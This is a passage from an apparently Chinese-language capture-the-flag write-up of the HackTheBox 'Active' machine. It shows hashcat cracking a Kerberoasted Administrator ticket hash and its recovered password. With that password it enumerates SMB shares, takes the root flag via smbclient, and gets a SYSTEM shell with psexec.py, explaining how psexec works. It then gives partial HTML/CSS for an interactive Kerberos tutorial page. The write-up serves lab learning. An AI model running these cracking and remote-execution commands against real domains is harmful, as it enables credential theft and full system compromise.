$ hashcat -m 13100 ./tgthash.out /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7543 32-Core Processor, 3921/7907 MB (988 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC 7543 32-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 0 secs

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$71933fbf68c6936f2ac6e0605c1bbd16$7820b44cced36e0b91c741f2eb92325c266ba682342a69adc5e8a9127f615ebc673d0bfbdbbd749bbad54dece750c6ac4c0fc65e81c0524eed518e646f7c92f8dba5ea9b545392326650c68ae6193729a513ba6ba2b917ee17cc03317cfdb16972d5f530128d4784b8b9e1d8142ee55eed854c3bb9ee75bb35a598a5e836bd60cd3893297802c041641110107c2f6e3e5c60d79140c16620e4da027b4337032cc9f22f095748d634927281d9bddfa7d0cd4e082e0eedbb891f831feb7b2bd3b4da7c41292a8592ede9dd9eaba4d2b84756a19af723a33545d8332a3d7247ef1969c591135dc01507961abc29c74ce444297e66016f449c4c32087827f37096819cb146bc6e0b4fe40677a3c81bb2e08598dbcd30609a9d6b8bb852849f0e6d482d524a542017c799ca4caf7646f647ba6d9daec33242d8f5d0a7d7838ae5720e4299b89855b6f091cbd56ce4c0c6be45b07ba0821b52fa8e4bfdd0b4b4913fc33a0ab414bf4e4b9261fcc3f2bcbc524d1ec61c258898823b179eb253b4cb3e58f2196124f4e4b29ea8230e4aeee6737bae2281cc047c8cd7154b1dd1bb9d787eebc3d25180b96a234dd9ddb02eb6ffda03f8229aa527131b84380bbcedbe762173f1b5331e8d2bfa597efa745539bdf829c69e3f1a8cb957595f3c15d2e82c59c47bfa5b41d63f6b1a6d5bbd4ae3d04978b73304badd21a59553d4c0911704e9c4c696c294d565a6a9e354b9e18efe7a4a1fbd545a890e674593570044c42286aed4fed2b0327beb9d3a2a1f78310fd4b0c489b55a747c8c08cfb0d5d5a266d4d2b96c4834bbbf5c44d3e7587edf4caa491fd6bff852b794c88f573f3c3b476fc71e5781db650d596adf18e2da71fa5b874e5d2c68699b8c9ee0c1b9befbc6c5af4953b84e4655768db5fa34c5b18996895d047f064c63bc63873212db1cc94c8c77a28b789675e8ec45208f055652f492adf88a4647437c743d82d2c613e4d62d18db58dd0b9feabe5e2855b42f4717d05a16c7a3d15fd2492eabba280171ae68a35ec1164d7fbc993a41bfe43052aa4ce51894aac6e127f407bb66f3966c3523cd9224016d65f05b8009d7b2bf18478abf508936c390adc477f189190ed768c8801a0ea4633633c779f9b9dd82fef27c3dd41cd3d536ebce28fb728a48d086eced8528f4f48440724965e2c1d055368eb634e3572907cd2a00d1c5d8605da27cb04fded0f6d4a9b23247023b2bf632512356b6605695dbea7f:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...dbea7f
Time.Started.....: Sun May 31 08:52:34 2026 (5 secs)
Time.Estimated...: Sun May 31 08:52:39 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1905.1 kH/s (0.81ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344384 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344384 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany93 -> Thelink

Started: Sun May 31 08:52:32 2026
Stopped: Sun May 31 08:52:41 2026
```

得到的明文密码是：

```
Ticketmaster1968
```

### 3、SMB 共享枚举

```bash
$ smbmap -H 10.129.7.74 -u 'Administrator' -p 'Ticketmaster1968'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[!] Unable to remove test file at \\10.129.7.74\SYSVOL\BLGDFQUNYX.txt, please remove manually                                
                                                                                                                             
[+] IP: 10.129.7.74:445	Name: active.htb          	Status: ADMIN!!!   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C$                                                	READ, WRITE	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ, WRITE	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ, WRITE	Logon server share 
	Users                                             	READ ONLY	
[*] Closed 1 connections
```

从输出：

```
Status: ADMIN!!!
```

以及对 C$ 和 ADMIN$ 共享具有读写权限，可以看出，当前账号的权限至少是管理员权限，甚至可能是 SYSTEM。

`C$` 就是 C 盘的隐藏管理共享，通过 `smbclient` 建立与该共享之间的 Session，就能访问整个 C 盘文件系统，在其中就能找到 root flag：

```bash
$ smbclient //10.129.7.74/c$ -U 'Administrator'%'Ticketmaster1968'
Try "help" to get a list of possible commands.
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Jan 21 11:49:47 2021
  ..                                 DR        0  Thu Jan 21 11:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 09:50:10 2018
  root.txt                           AR       34  Sun May 31 08:13:47 2026

		5217023 blocks of size 4096. 277621 blocks available
smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

```bash
$ cat root.txt 
f32fd************************
```

我们也可以利用后渗透工具 psexec.py 获得一个交互式 shell：

```
$ psexec.py active.htb/administrator@10.129.7.74
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.129.7.74.....
[*] Found writable share ADMIN$
[*] Uploading file XFiGSSMP.exe
[*] Opening SVCManager on 10.129.7.74.....
[*] Creating service NlhO on 10.129.7.74.....
[*] Starting service NlhO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> chcp 65001
Active code page: 65001

C:\Windows\system32> cd \

C:\> dir root.txt /s
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

31/05/2026  03:13 μμ                34 root.txt
               1 File(s)             34 bytes

     Total Files Listed:
               1 File(s)             34 bytes
               0 Dir(s)   1.142.513.664 bytes free

C:\> type C:\Users\Administrator\Desktop\root.txt
f32fd***********************
```

通过日志信息：

```
[*] Requesting shares on 10.129.7.74.....
[*] Found writable share ADMIN$
[*] Uploading file XFiGSSMP.exe
[*] Opening SVCManager on 10.129.7.74.....
[*] Creating service NlhO on 10.129.7.74.....
[*] Starting service NlhO.....
[!] Press help for extra shell commands
```

能看出该工具返回 Shell 的原理。

psexec 首先查看了目标上的共享（用当前用户的权限），找到了可写共享 ADMIN$，然后写入文件 XFiGSSMP.exe。

接着，psexec 用当前凭证连到目标的 SVCManager（服务控制管理器，走的是 RPC over SMB，`\pipe\svcctl`），创建一个新服务 `NlhO`（名字随机），指向刚上传的那个 exe。

最后，服务启动 → 之前上传的 exe 以 **SYSTEM 权限**执行（因为运行它的是 SVCManager，本质上是 `svchost.exe` 的一个实例，而 `svchost.exe` 是 SYSTEM 启动的进程） → 这个 exe 的工作就是"启动一个 cmd.exe 进程、重定向 stdin/stdout/stderr 到一个命名管道"→ psexec 本地那端连到这个命名管道 → 最终看到返回一个交互式 shell。

## 四、HTML

这就是上面提到的可看到交互式 Kerberos 流程的 HTML 源码，大家可以自己本地打开：

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kerberos · 交互式学习</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
<style>
/* ===== DARK (default) ===== */
:root{
  --bg:#0a0e14;
  --bg2:#0f141d;
  --panel:#141b26;
  --panel2:#1a2330;
  --line:#26323f;
  --line2:#33404f;
  --ink:#e6edf3;
  --ink-dim:#9aa7b4;
  --ink-faint:#62707e;
  --ink-body:#c3cdd6;
  --ink-list:#cdd6df;
  --subtle-line:rgba(38,50,63,.5);
  --chip-bg:rgba(20,27,38,.6);
  --soft-hover:rgba(54,197,240,.04);
  --selected-card:rgba(255,255,255,.035);
  --floating-shadow:rgba(0,0,0,.5);
  --on-accent:#0a0e14;
  /* semantic colors */
  --key-user:#f0a500;     /* User key  — amber */
  --key-kdc:#ff4d5e;      /* KDC/krbtgt — crimson */
  --key-svc:#36c5f0;      /* Service key — cyan */
  --key-sess:#9d7bff;     /* Session key — violet */
  --key-ssess:#2ee6a6;    /* Service session key — green */
  --accent:#ffcb47;
  --danger:#ff4d5e;
  --grid:rgba(54,197,240,.045);
}
/* ===== LIGHT values (shared) ===== */
[data-theme="light"]{
  --bg:#eef1f6;
  --bg2:#e3e9f1;
  --panel:#ffffff;
  --panel2:#f3f6fa;
  --line:#d6dde7;
  --line2:#c2ccd9;
  --ink:#161d28;
  --ink-dim:#46566a;
  --ink-faint:#7e8da0;
  --ink-body:#263446;
  --ink-list:#243246;
  --subtle-line:rgba(194,204,217,.78);
  --chip-bg:rgba(255,255,255,.78);
  --soft-hover:rgba(10,130,184,.075);
  --selected-card:rgba(10,130,184,.075);
  --floating-shadow:rgba(61,75,95,.18);
  --on-accent:#2a1d00;
  --key-user:#b07400;
  --key-kdc:#d62d40;
  --key-svc:#0a82b8;
  --key-sess:#6a3fd6;
  --key-ssess:#009267;
  --accent:#cf9100;
  --danger:#d62d40;
  --grid:rgba(10,130,184,.06);
}
/* ===== FOLLOW SYSTEM (no explicit data-theme) ===== */
@media(prefers-color-scheme:light){
  :root:not([data-theme]){
    --bg:#eef1f6; --bg2:#e3e9f1; --panel:#ffffff; --panel2:#f3f6fa;
    --line:#d6dde7; --line2:#c2ccd9; --ink:#161d28; --ink-dim:#46566a;
    --ink-faint:#7e8da0; --ink-body:#263446; --ink-list:#243246;
    --subtle-line:rgba(194,204,217,.78); --chip-bg:rgba(255,255,255,.78);
    --soft-hover:rgba(10,130,184,.075); --selected-card:rgba(10,130,184,.075);
    --floating-shadow:rgba(61,75,95,.18); --on-accent:#2a1d00;
    --key-user:#b07400; --key-kdc:#d62d40; --key-svc:#0a82b8;
    --key-sess:#6a3fd6; --key-ssess:#009267; --accent:#cf9100;
    --danger:#d62d40; --grid:rgba(10,130,184,.06);
  }
}
:root,[data-theme]{transition:background-color .3s,color .3s}
*{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth}
body{
  background:
    radial-gradient(1200px 700px at 80% -10%, rgba(54,197,240,.06), transparent 60%),
    radial-gradient(900px 600px at 0% 100%, rgba(157,123,255,.05), transparent 55%),
    var(--bg);
  color:var(--ink);
  font-family:'Noto Sans SC',sans-serif;
  line-height:1.75;
  font-weight:300;
  -webkit-font-smoothing:antialiased;
  overflow-x:hidden;
}
body::before{
  content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
  background-image:linear-gradient(var(--grid) 1px,transparent 1px),linear-gradient(90deg,var(--grid) 1px,transparent 1px);
  background-size:44px 44px;
}
.wrap{max-width:1080px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
code,.mono{font-family:'JetBrains Mono',monospace}

/* ---------- HERO ---------- */
.hero{padding:90px 0 50px;border-bottom:1px solid var(--line)}
.hero .tag{
  font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:.32em;
  color:var(--key-svc);text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:10px
}
.hero .tag::before{content:"";width:34px;height:1px;background:var(--key-svc)}
.hero h1{
  font-family:'Chakra Petch',sans-serif;font-weight:700;
  font-size:clamp(46px,9vw,104px);line-height:.95;letter-spacing:-.02em;color:var(--ink);
  text-shadow:0 0 60px rgba(54,197,240,.15)
}
.hero h1 b{color:var(--accent);font-weight:700}
.hero .sub{margin-top:22px;max-width:640px;color:var(--ink-dim);font-size:16px}
.hero .meta{margin-top:30px;display:flex;flex-wrap:wrap;gap:10px}
.chip{
  font-family:'JetBrains Mono',monospace;font-size:12px;padding:7px 13px;border:1px solid var(--line2);
  border-radius:2px;color:var(--ink-dim);background:var(--chip-bg);box-shadow:0 8px 24px -18px var(--floating-shadow)
}
.chip b{color:var(--accent);font-weight:500}

/* ---------- SECTIONS ---------- */
section{padding:64px 0;border-bottom:1px solid var(--line)}
.sec-no{font-family:'Chakra Petch',sans-serif;font-size:13px;letter-spacing:.3em;color:var(--key-svc);font-weight:600}
h2{
  font-family:'Chakra Petch',sans-serif;font-weight:600;font-size:clamp(26px,4vw,38px);
  margin:8px 0 8px;letter-spacing:-.01em;color:var(--ink);display:flex;align-items:baseline;gap:14px
}
h2 .en{font-family:'JetBrains Mono',monospace;font-size:14px;color:var(--ink-faint);font-weight:400;letter-spacing:.05em}
.lead{color:var(--ink-dim);max-width:760px;margin-bottom:8px}
h3{font-family:'Chakra Petch',sans-serif;font-weight:600;font-size:21px;margin:38px 0 14px;color:var(--ink);display:flex;align-items:center;gap:12px}
h3 .idx{
  font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--on-accent);background:var(--accent);
  width:26px;height:26px;display:grid;place-items:center;border-radius:3px;font-weight:700;flex:none
}
p{margin:12px 0;color:var(--ink-body);font-weight:300}
strong,b{color:var(--ink);font-weight:500}
.callout{
  border-left:3px solid var(--accent);background:linear-gradient(90deg,rgba(255,203,71,.07),transparent);
  padding:16px 20px;margin:20px 0;border-radius:0 6px 6px 0;font-size:14.5px
}
.callout.warn{border-color:var(--danger);background:linear-gradient(90deg,rgba(255,77,94,.08),transparent)}
.callout .lbl{font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.2em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:6px}
.callout.warn .lbl{color:var(--danger)}
kbd{font-family:'JetBrains Mono',monospace;background:var(--panel2);border:1px solid var(--line2);padding:1px 7px;border-radius:3px;font-size:.85em;color:var(--key-svc)}

/* ---------- KEY LEGEND ---------- */
.keygrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-top:18px}
.keycard{
  background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:16px;
  position:relative;overflow:hidden;transition:.25s
}
.keycard::before{content:"";position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--c)}
.keycard:hover{transform:translateY(-3px);border-color:var(--c);box-shadow:0 10px 30px -12px var(--c)}
.keycard.selected{background:var(--selected-card);border-color:color-mix(in srgb,var(--accent) 62%,var(--line2))}
.keycard .nm{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:14px;color:var(--c);display:flex;align-items:center;gap:8px}
.keycard .nm svg{width:15px;height:15px}
.keycard .ds{font-size:13px;color:var(--ink-dim);margin-top:7px;font-weight:300}

/* ---------- ETYPE TOGGLE ---------- */
.etype-box{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:24px;margin-top:18px}
.etype-tabs{display:flex;gap:0;border:1px solid var(--line2);border-radius:6px;overflow:hidden;width:fit-content}
.etype-tabs button{
  font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:500;padding:10px 22px;background:transparent;
  color:var(--ink-dim);border:none;cursor:pointer;transition:.2s;border-right:1px solid var(--line2)
}
.etype-tabs button:last-child{border-right:none}
.etype-tabs button.on{background:var(--accent);color:var(--on-accent);font-weight:700}
.etype-body{margin-top:20px;display:grid;grid-template-columns:1fr auto 1fr;gap:18px;align-items:center}
.etype-stage{background:var(--bg2);border:1px solid var(--line);border-radius:8px;padding:16px;text-align:center}
.etype-stage .t{font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.15em;color:var(--ink-faint);text-transform:uppercase}
.etype-stage .v{font-family:'JetBrains Mono',monospace;font-size:15px;color:var(--accent);margin-top:8px;font-weight:500;word-break:break-all}
.etype-arrow{font-family:'JetBrains Mono',monospace;color:var(--key-svc);font-size:13px;text-align:center}
.etype-arrow .fn{font-size:11px;color:var(--ink-faint);display:block}
.etype-note{margin-top:18px;font-size:13.5px;color:var(--ink-dim);font-weight:300;border-top:1px dashed var(--line2);padding-top:14px}
@media(max-width:640px){.etype-body{grid-template-columns:1fr}.etype-arrow{transform:rotate(90deg)}}

/* ---------- TICKET INSPECTOR ---------- */
.tickets{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:18px}
@media(max-width:720px){.tickets{grid-template-columns:1fr}}
.ticket{
  background:var(--panel);border:1px solid var(--line);border-radius:10px;overflow:hidden;cursor:pointer;transition:.25s
}
.ticket:hover{border-color:var(--tc)}
.ticket .thd{padding:16px 18px;display:flex;align-items:center;justify-content:space-between;gap:10px}
.ticket .thd .nm{font-family:'Chakra Petch',sans-serif;font-weight:700;font-size:17px;color:var(--tc)}
.ticket .thd .en{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ink-faint)}
.ticket .lockbar{
  font-family:'JetBrains Mono',monospace;font-size:11.5px;padding:8px 18px;background:color-mix(in srgb,var(--tc) 14%,transparent);
  color:var(--tc);display:flex;align-items:center;gap:8px;border-top:1px solid color-mix(in srgb,var(--tc) 25%,transparent)
}
.ticket .body{max-height:0;overflow:hidden;transition:max-height .4s ease}
.ticket.open .body{max-height:420px}
.ticket .body ul{list-style:none;padding:14px 18px 18px}
.ticket .body li{
  font-size:13.5px;padding:9px 12px;background:var(--bg2);border:1px solid var(--line);border-radius:5px;margin-bottom:7px;
  display:flex;align-items:center;gap:9px;color:var(--ink-list);font-weight:300
}
.ticket .body li .dot{width:7px;height:7px;border-radius:50%;flex:none}
.ticket .hint{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--ink-faint);padding:0 18px 14px;letter-spacing:.05em}

/* ---------- FLOW PLAYER ---------- */
.flow{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:0;margin-top:22px;overflow:hidden}
.flow-top{display:grid;grid-template-columns:1fr 1.6fr;min-height:430px}
@media(max-width:820px){.flow-top{grid-template-columns:1fr}}
.stage{position:relative;background:
  radial-gradient(460px 380px at 50% 22%,color-mix(in srgb,var(--key-svc) 8%,transparent),transparent),var(--bg2);
  border-right:1px solid var(--line);min-height:440px;overflow:hidden}
@media(max-width:820px){.stage{border-right:none;border-bottom:1px solid var(--line);min-height:360px}}
.tri{position:absolute;inset:0;width:100%;height:100%;z-index:1;overflow:visible}
.edge{stroke:var(--line2);stroke-width:1.4;fill:none;stroke-linecap:round}
.edge.dashed{stroke-dasharray:3 6;opacity:.55}
.arrow{stroke:var(--accent);stroke-width:2.6;fill:none;stroke-linecap:round;stroke-dasharray:8 7;
  opacity:0;transition:opacity .25s;animation:flow 1s linear infinite}
.arrow.on{opacity:1}
#ah path{fill:var(--accent)}
@keyframes flow{to{stroke-dashoffset:-15}}
.tnode{position:absolute;transform:translate(-50%,-50%);z-index:3;display:flex;flex-direction:column;align-items:center;gap:7px;text-align:center}
.tnode .box{
  width:94px;height:54px;border:1.5px solid var(--line2);border-radius:9px;background:var(--panel2);
  display:grid;place-items:center;font-family:'Chakra Petch',sans-serif;font-weight:700;font-size:14px;
  color:var(--ink-dim);transition:.3s
}
.tnode.active .box{border-color:var(--accent);color:var(--accent);
  box-shadow:0 0 28px -4px color-mix(in srgb,var(--accent) 55%,transparent);
  background:color-mix(in srgb,var(--accent) 8%,var(--panel2))}
.tnode .role{font-family:'JetBrains Mono',monospace;font-size:9.5px;color:var(--ink-faint);letter-spacing:.08em;line-height:1.3}
.edgelabel{position:absolute;z-index:2;transform:translate(-50%,-50%);font-family:'JetBrains Mono',monospace;
  font-size:9.5px;letter-spacing:.12em;color:var(--ink-faint);background:var(--bg2);padding:2px 8px;border-radius:11px;border:1px solid var(--line)}
.packet{
  position:absolute;left:50%;top:50%;z-index:5;
  transform:translate(-50%,-50%) scale(.55);opacity:0;
  font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;
  padding:5px 11px;border-radius:6px;white-space:nowrap;border:1px solid;pointer-events:none;
  transition:left .62s cubic-bezier(.45,0,.25,1),top .62s cubic-bezier(.45,0,.25,1),opacity .3s,transform .3s
}
.packet.show{opacity:1;transform:translate(-50%,-50%) scale(1)}
.packet.req{color:var(--key-svc);border-color:var(--key-svc);background:color-mix(in srgb,var(--key-svc) 14%,var(--panel))}
.packet.rep{color:var(--key-ssess);border-color:var(--key-ssess);background:color-mix(in srgb,var(--key-ssess) 14%,var(--panel))}

/* detail panel */
.detail{padding:24px 26px;display:flex;flex-direction:column}
.detail .step-no{font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.2em;color:var(--ink-faint)}
.detail .msg{font-family:'Chakra Petch',sans-serif;font-weight:700;font-size:24px;color:var(--accent);margin:4px 0 2px}
.detail .dir{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--key-svc);margin-bottom:14px}
.detail .desc{font-size:14px;color:var(--ink-dim);margin-bottom:16px;font-weight:300;min-height:42px}
.fields{display:flex;flex-direction:column;gap:8px}
.field{
  border:1px solid var(--line);border-radius:7px;padding:11px 13px;background:var(--bg2);
  animation:pop .4s ease backwards
}
.field .fh{display:flex;align-items:center;gap:9px;font-size:13.5px;color:var(--ink);font-weight:500}
.field .lock{
  font-family:'JetBrains Mono',monospace;font-size:10px;padding:2px 8px;border-radius:20px;display:inline-flex;
  align-items:center;gap:5px;margin-left:auto;font-weight:500;cursor:help
}
.field .lock svg{width:11px;height:11px}
.field .inner{margin-top:9px;padding-left:12px;border-left:2px dashed var(--line2);display:flex;flex-direction:column;gap:5px}
.field .inner span{font-size:12.5px;color:var(--ink-dim);font-weight:300;display:flex;align-items:center;gap:7px}
.field .inner span::before{content:"▸";color:var(--ink-faint);font-size:10px}
@keyframes pop{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}

.controls{display:flex;align-items:center;gap:10px;padding:16px 26px;border-top:1px solid var(--line);background:var(--panel2);flex-wrap:wrap}
.controls button{
  font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:500;padding:9px 16px;border-radius:6px;cursor:pointer;
  border:1px solid var(--line2);background:var(--panel);color:var(--ink);transition:.2s;display:flex;align-items:center;gap:7px
}
.controls button:hover{border-color:var(--accent);color:var(--accent)}
.controls button.primary{background:var(--accent);color:var(--on-accent);border-color:var(--accent);font-weight:700}
.controls button.primary:hover{filter:brightness(1.05);color:var(--on-accent)}
.controls button:disabled{opacity:.35;cursor:not-allowed}
.steptrack{display:flex;gap:5px;margin-left:auto}
.steptrack i{width:26px;height:5px;border-radius:3px;background:var(--line2);transition:.3s;cursor:pointer}
.steptrack i.done{background:var(--key-svc)}
.steptrack i.cur{background:var(--accent);transform:scaleY(1.6)}

/* ---------- generic lists ---------- */
ul.clean{list-style:none;margin:14px 0}
ul.clean li{position:relative;padding:7px 0 7px 26px;color:var(--ink-body);font-weight:300;font-size:14.5px;border-bottom:1px solid var(--subtle-line)}
ul.clean li::before{content:"";position:absolute;left:4px;top:15px;width:7px;height:7px;border:1.5px solid var(--key-svc);transform:rotate(45deg)}
ul.clean li b{color:var(--ink)}

.msgtable{width:100%;border-collapse:collapse;margin-top:16px;font-size:13.5px}
.msgtable td,.msgtable th{padding:11px 14px;border-bottom:1px solid var(--line);text-align:left}
.msgtable th{font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.1em;color:var(--ink-faint);text-transform:uppercase;font-weight:500}
.msgtable td:first-child{font-family:'JetBrains Mono',monospace;color:var(--accent);font-weight:500;white-space:nowrap}
.msgtable tr:hover td{background:var(--soft-hover)}

footer{padding:50px 0 70px;color:var(--ink-faint);font-size:12.5px;font-family:'JetBrains Mono',monospace;text-align:center}
footer b{color:var(--ink-dim)}

/* nav */
.nav{position:fixed;right:18px;top:50%;transform:translateY(-50%);z-index:20;display:flex;flex-direction:column;gap:11px}
@media(max-width:900px){.nav{display:none}}
.nav a{width:9px;height:9px;border-radius:50%;background:var(--line2);transition:.25s;position:relative}
.nav a:hover,.nav a.on{background:var(--accent);transform:scale(1.3)}
.nav a span{position:absolute;right:18px;top:50%;transform:translateY(-50%);font-family:'JetBrains Mono',monospace;font-size:11px;
  white-space:nowrap;color:var(--ink-dim);opacity:0;pointer-events:none;transition:.2s;background:var(--panel);padding:3px 9px;border-radius:4px;border:1px solid var(--line)}
.nav a:hover span{opacity:1}

/* theme toggle */
.theme-btn{position:fixed;top:18px;right:18px;z-index:30;display:flex;align-items:center;gap:8px;
  font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:500;padding:8px 13px;cursor:pointer;
  background:var(--panel);color:var(--ink);border:1px solid var(--line2);border-radius:30px;transition:.2s;
  box-shadow:0 6px 20px -10px var(--floating-shadow)}
.theme-btn:hover{border-color:var(--accent);color:var(--accent)}
.theme-btn .ico{font-size:14px;line-height:1}
</style>
</head>
<body>

<button class="theme-btn" id="themeBtn" title="切换主题：系统 / 亮 / 暗">
  <span class="ico" id="themeIco">◐</span><span id="themeLbl">系统</span>
</button>

<div class="nav">
  <a href="#top" class="on"><span>顶部</span></a>
  <a href="#what"><span>什么是 Kerberos</span></a>
  <a href="#core"><span>核心要素</span></a>
  <a href="#keys"><span>加密密钥</span></a>
  <a href="#tickets"><span>票据</span></a>
  <a href="#flow"><span>认证流程</span></a>
</div>

<!-- HERO -->
<header class="hero" id="top">
  <div class="wrap">
    <div class="tag">Authentication Protocol · Active Directory</div>
    <h1>KERBE<b>R</b>OS</h1>
    <p class="sub">一个基于<strong>对称密钥</strong>的身份验证协议。它只回答"你是谁"，不回答"你能访问什么"——授权由各服务依据自身 ACL 决定。下面用可交互的方式拆解它的核心结构与三段认证流程。</p>
    <div class="meta">
      <span class="chip">端口 <b>UDP/TCP 88</b></span>
      <span class="chip">核心 <b>KDC = AS + TGS</b></span>
      <span class="chip">票据 <b>TGT · TGS</b></span>
      <span class="chip">默认加密 <b>AES (etype 17/18)</b></span>
    </div>
  </div>
</header>

<!-- 一、WHAT -->
<section id="what">
  <div class="wrap">
    <div class="sec-no">SECTION 01</div>
    <h2>什么是 Kerberos <span class="en">// what is it</span></h2>
    <p>首先，<strong>Kerberos 是一个身份验证（Authentication）协议，而不是授权（Authorization）协议。</strong>换句话说，它允许识别每个提供密码的用户是谁，但它并不验证该用户可以访问哪些资源或服务。</p>
    <p>在 AD（Active Directory，活动目录）中，微软通过票据中嵌入的 <strong>PAC（Privilege Attribute Certificate）</strong>让 Kerberos 顺带携带用户的权限信息（SID、组成员等），但 <strong>KDC（Key Distribution Center）仅负责签名传递</strong>，最终是否放行由各服务依据自身 ACL 决定。</p>
    <div class="callout">
      <span class="lbl">理解要点</span>
      KDC 告诉服务"你是谁、属于哪些组"，但"你能不能进我这道门"由服务自己拍板。携带授权信息（PAC）是微软在标准 Kerberos 之上的扩展，并非 RFC 4120 原生功能。
    </div>
  </div>
</section>

<!-- 二、CORE -->
<section id="core">
  <div class="wrap">
    <div class="sec-no">SECTION 02</div>
    <h2>核心要素 <span class="en">// core elements</span></h2>

    <h3><span class="idx">1</span>传输层</h3>
    <p>Kerberos 使用 UDP 或 TCP 作为传输层协议，并以明文形式发送数据。因此，<strong>Kerberos 自身负责提供加密</strong>。它使用的端口是 <kbd>UDP/88</kbd> 和 <kbd>TCP/88</kbd>，这两个端口应在 KDC 上进行监听。</p>

    <h3><span class="idx">2</span>Agents（参与者）</h3>
    <ul class="clean">
      <li><b>Client</b>：想要访问服务的用户。</li>
